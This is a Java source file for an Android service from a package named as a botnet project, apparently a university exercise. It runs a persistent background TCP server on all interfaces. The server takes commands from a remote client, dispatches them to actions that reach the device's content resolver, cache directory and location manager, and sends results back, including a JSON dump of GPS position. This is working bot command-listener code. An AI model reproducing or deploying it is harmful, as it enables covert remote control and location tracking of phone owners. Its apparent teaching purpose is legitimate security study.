package de.tudarmstadt.botnet.janus_yanai;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

class LineHandler implements Runnable {
	String line;
	PrintWriter out;
	Context context;
	LineHandler(String line, PrintWriter out, Context context) {
		this.line = line;
		this.out = out;
		this.context = context;
	}
	
	static JSONObject textout(String msg) {
		try {
			return new JSONObject().put("data", msg).put("type", "text");
		} catch (JSONException e) {
			throw new RuntimeException(e);
		}
	}
	
	@Override
	public void run() {
		JSONObject obj = null;
		try {
			for (Action i : new ServerActions(context.getContentResolver(), context.getCacheDir(), (LocationManager)context.getSystemService(Context.LOCATION_SERVICE)).getActions()) {
				if (line.startsWith(i.getToken())) {
					obj = i.call(line.substring(i.getToken().length()));
				}
			}
			
			if (obj == null)
				obj = textout("unknown command");
			
			ServerLoop.logg(out, obj.toString());
		} catch (Exception e) {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			PrintStream ps = new PrintStream(baos);
			e.printStackTrace(ps);
			String content = baos.toString();
			
			ServerLoop.logg(out, textout(content).toString());
		}
		
		ServerLoop.logg(out, "\0");
	}
}

class ServerLoop implements Runnable {

	Context context;
	Handler handler;

	PrintWriter out;
	
	ServerLoop(Context context, Handler handler) {
		this.context = context;
		this.handler = handler;
	}
	
	void logg(final String txt) {
		logg(out, txt);
	}
	
	static void logg(PrintWriter out, String txt) {
		out.print(txt);
		out.flush();
	}

	ServerSocket serverSocket;
	
	public void run() {
		

		try {
			
			serverSocket = new ServerSocket(ServerService.SERVERPORT);
			while (true) {
				toast("Listening on IP: " + ServerService.SERVERIP + ":" + ServerService.SERVERPORT);
				final Socket client;
				try {
					client = serverSocket.accept();
				} catch (SocketException e) {
					// probably closed by server restart
					break;
				}

				//new Thread(new ConnectionHandler(this, client)).start();
				ConnectionHandler.run(handler, client, context);
			}
		} catch (IOException e) {
			e.printStackTrace();
			toast(e.getMessage());
		}
	}
	
	void toast(String s) {
		Log.d(ServerService.DEBUG_TAG, s);
	}
}

class ConnectionHandler {
	
		public static void run(Handler handler, Socket client, Context context) {
			//Connected

			try {
				BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
				PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(client.getOutputStream())), true);
				String line;
				while ((line = in.readLine()) != null) {
					handler.post(new LineHandler(line, out, context));
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		};
}

public class ServerService extends Service {
	
	/**
     * Class for clients to access.  Because we know this service always
     * runs in the same process as its clients, we don't need to deal with
     * IPC.
     */
    public class LocalBinder extends Binder {
    	ServerService getService() {
            return ServerService.this;
        }
    }

    static JSONObject getJSONLocation(Location location) throws JSONException {
	    JSONObject obj = new JSONObject();
	    if (location == null) return obj;
	    if (location.hasAccuracy()) obj.put("accuracy", location.getAccuracy());
	    if (location.hasAltitude()) obj.put("altitude", location.getAltitude());
	    if (location.hasBearing() ) obj.put("bearing" , location.getBearing());
	    if (location.hasAccuracy()) obj.put("speed", location.getSpeed());
	    
	    obj.put("latitude",location.getLatitude());
	    obj.put("longitude",location.getLongitude());
	    obj.put("provider",location.getProvider());
	    obj.put("time",location.getTime());
	    return obj;
    }
    
    @Override
    public void onCreate() {
        //mNM = (NotificationManager)getSystemService(NOTIFICATION_SERVICE);
    			
    	
		startServer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(ServerService.DEBUG_TAG, "Received start id " + startId + ": " + intent);
        // We want this service to continue running until it is explicitly
        // stopped, so return sticky.
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        // Cancel the persistent notification.
        //mNM.cancel(NOTIFICATION);

    	try {
			st.serverSocket.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		} catch (NullPointerException e2) {
			e2.printStackTrace();
		}
		
    	fst.interrupt();
    	try {
			fst.join();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
    	
        // Tell the user we stopped.
        Toast.makeText(this, "local service stopped", Toast.LENGTH_SHORT).show();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    // This is the object that receives interactions from clients.  See
    // RemoteService for a more complete example.
    private final IBinder mBinder = new LocalBinder();
	
    //////////////////////////////////////////////////
    
    static final String DEBUG_TAG = "ServerService";

    static String SERVERIP = "0.0.0.0";

	// designate a port
	static final int SERVERPORT = Config.serverport;

	ServerLoop st;
	Thread fst;
	
	Handler handler = new Handler();

	private void startServer() {
		st = new ServerLoop(this, handler);
		
		fst = new Thread(st);
		fst.start();
		
	}

}

